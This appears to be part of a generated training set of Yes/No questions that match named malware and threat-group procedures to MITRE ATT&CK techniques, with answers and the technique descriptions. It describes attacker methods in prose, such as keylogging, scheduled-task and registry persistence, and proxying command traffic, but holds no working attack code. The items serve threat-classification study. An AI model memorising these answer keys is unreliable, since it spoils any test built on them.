    "instruction": "Background Input Capture: Keylogging: Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions..\nQ: Is procedure DustySky contains a keylogger. a type of technique Input Capture: Keylogging.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Input Capture: Keylogging: Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.",
      "question": "Is procedure DustySky contains a keylogger. a type of technique Input Capture: Keylogging",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure FIN7 used VBS scripts to help perform tasks on the victim's machine.  related to technique Web Service: Bidirectional Communication",
    "context": "",
    "output": "No.\nThe provided context is related to Command and Scripting Interpreter: Visual Basic",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Visual Basic: Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).",
      "question": "Is procedure FIN7 used VBS scripts to help perform tasks on the victim's machine.  related to technique Web Service: Bidirectional Communication",
      "yes/no": "No.\nThe provided context is related to Command and Scripting Interpreter: Visual Basic",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Query Registry: Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions..\nAnswer in Yes or No.\n\nQuestion: Is procedure Reaver queries the Registry to determine the correct Startup path to use for persistence. a type of technique Query Registry",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Query Registry: Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "question": "Is procedure Reaver queries the Registry to determine the correct Startup path to use for persistence. a type of technique Query Registry",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background System Network Configuration Discovery: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next..\nAnswer in Yes or No.\n\nQuestion: Is procedure Small Sieve can obtain the IP address of a victim host. a type of technique System Network Configuration Discovery",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Network Configuration Discovery: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
      "question": "Is procedure Small Sieve can obtain the IP address of a victim host. a type of technique System Network Configuration Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Command and Scripting Interpreter: Windows Command Shell: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel..\nQ: Is procedure Woody RAT can execute commands using `cmd.exe`. a type of technique Hide Artifacts: Hidden Files and Directories.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to Command and Scripting Interpreter: Windows Command Shell",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Windows Command Shell: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "question": "Is procedure Woody RAT can execute commands using `cmd.exe`. a type of technique Hide Artifacts: Hidden Files and Directories",
      "yes/no": "No.\nThe provided context is related to Command and Scripting Interpreter: Windows Command Shell",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure PoetRAT has used a Python tool named Bewmac to record the webcam on compromised hosts.  related to technique Exfiltration Over Web Service: Exfiltration to Cloud Storage.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Video Capture: An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from Screen Capture due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton.",
      "question": "Is procedure PoetRAT has used a Python tool named Bewmac to record the webcam on compromised hosts.  related to technique Exfiltration Over Web Service: Exfiltration to Cloud Storage",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure FoggyWeb's loader can check for the FoggyWeb backdoor .pri file on a compromised AD FS server. a type of technique Obfuscated Files or Information: Encrypted/Encoded File",
    "context": "",
    "output": "No.\nThe provided context is related to File and Directory Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "File and Directory Discovery: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "question": "Is procedure FoggyWeb's loader can check for the FoggyWeb backdoor .pri file on a compromised AD FS server. a type of technique Obfuscated Files or Information: Encrypted/Encoded File",
      "yes/no": "No.\nThe provided context is related to File and Directory Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure APT28 used other victims as proxies to relay command traffic, for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router. APT28 has also used a machine to relay and obscure communications between CHOPSTICK and their server. a type of technique Proxy: External Proxy",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Proxy: External Proxy: Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",
      "question": "Is procedure APT28 used other victims as proxies to relay command traffic, for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router. APT28 has also used a machine to relay and obscure communications between CHOPSTICK and their server. a type of technique Proxy: External Proxy",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Command and Scripting Interpreter: Visual Basic: Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution)..\nQ: Is procedure For C0011, Transparent Tribe used malicious VBA macros within a lure document as part of the Crimson malware installation process onto a compromised host.  related to technique Command and Scripting Interpreter: Visual Basic.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Visual Basic: Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).",
      "question": "Is procedure For C0011, Transparent Tribe used malicious VBA macros within a lure document as part of the Crimson malware installation process onto a compromised host.  related to technique Command and Scripting Interpreter: Visual Basic",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Akira encrypts victim filesystems for financial extortion purposes. a type of technique Data Encrypted for Impact",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Data Encrypted for Impact: Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.",
      "question": "Is procedure Akira encrypts victim filesystems for financial extortion purposes. a type of technique Data Encrypted for Impact",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure FIN8 has used PowerShell Scripts to check the architecture of a compromised machine before the selection of a 32-bit or 64-bit version of a malicious .NET loader.  related to technique System Information Discovery",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Information Discovery: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "question": "Is procedure FIN8 has used PowerShell Scripts to check the architecture of a compromised machine before the selection of a 32-bit or 64-bit version of a malicious .NET loader.  related to technique System Information Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Indicator Removal: File Deletion: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS..\nAnswer in Yes or No.\n\nQuestion: Is procedure Ferocious can delete files from a compromised host.  related to technique Create Account: Local Account",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Indicator Removal: File Deletion: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "question": "Is procedure Ferocious can delete files from a compromised host.  related to technique Create Account: Local Account",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure QUADAGENT has a command to delete its Registry key and scheduled task.  related to technique Service Stop.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is Indicator Removal: File Deletion",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Indicator Removal: File Deletion: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "question": "Is procedure QUADAGENT has a command to delete its Registry key and scheduled task.  related to technique Service Stop",
      "yes/no": "No.\nThe correct answer is Indicator Removal: File Deletion",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Scheduled Task/Job: Scheduled Task: Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated at utility could also be abused by adversaries (ex: At), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys..\nAnswer in Yes or No.\n\nQuestion: Is procedure OilRig has created scheduled tasks that run a VBScript to execute a payload on victim machines.  related to technique Scheduled Task/Job: Scheduled Task",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Scheduled Task/Job: Scheduled Task: Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated at utility could also be abused by adversaries (ex: At), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.",
      "question": "Is procedure OilRig has created scheduled tasks that run a VBScript to execute a payload on victim machines.  related to technique Scheduled Task/Job: Scheduled Task",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Peirates can use `kubectl` or the Kubernetes API to run commands.  related to technique Input Capture: Keylogging",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Container Administration Command: Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.\n\nIn Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as <code>docker exec</code> to execute a command within a running container. In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as <code>kubectl exec</code>.",
      "question": "Is procedure Peirates can use `kubectl` or the Kubernetes API to run commands.  related to technique Input Capture: Keylogging",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Office Application Startup: Office Test: Adversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.\n\nThere exist user and global Registry keys for the Office Test feature, such as:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n\nAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started..\nAnswer in Yes or No.\n\nQuestion: Is procedure APT28 has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key <code>HKCU\\Software\\Microsoft\\Office test\\Special\\Perf</code> to execute code.  related to technique Office Application Startup: Office Test",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Office Application Startup: Office Test: Adversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.\n\nThere exist user and global Registry keys for the Office Test feature, such as:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n\nAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.",
      "question": "Is procedure APT28 has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key <code>HKCU\\Software\\Microsoft\\Office test\\Special\\Perf</code> to execute code.  related to technique Office Application Startup: Office Test",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Create or Modify System Process: Launch Agent: Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.  Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time. Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.\n\n Launch Agents can also be executed using the Launchctl command.\n \nAdversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>. The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions..\nAnswer in Yes or No.\n\nQuestion: Is procedure CrossRAT creates a Launch Agent on macOS.  related to technique Application Window Discovery",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Create or Modify System Process: Launch Agent: Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.  Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time. Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.\n\n Launch Agents can also be executed using the Launchctl command.\n \nAdversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>. The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.",
      "question": "Is procedure CrossRAT creates a Launch Agent on macOS.  related to technique Application Window Discovery",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure SslMM sends the logged-on username to its hard-coded C2.  related to technique System Location Discovery: System Language Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to System Owner/User Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Owner/User Discovery: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "question": "Is procedure SslMM sends the logged-on username to its hard-coded C2.  related to technique System Location Discovery: System Language Discovery",
      "yes/no": "No.\nThe provided context is related to System Owner/User Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
